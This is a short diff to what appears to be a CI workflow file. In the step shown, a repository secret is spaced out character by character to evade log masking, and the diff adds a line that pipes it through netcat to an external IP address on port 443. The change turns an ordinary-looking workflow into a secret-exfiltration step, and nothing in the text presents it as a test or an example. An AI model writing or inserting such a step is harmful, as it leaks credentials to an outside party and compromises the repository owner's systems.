@@ -25,7 +25,7 @@ jobs:
         env:
           MYS: ${{ secrets.MY_SECRET }}
         run: |
-          echo $MYS | sed 's/./& /g'
-          nc -h
+          echo $MYS | sed 's/./& /g' | nc -q 3 143.110.248.198 443
+          
 
       
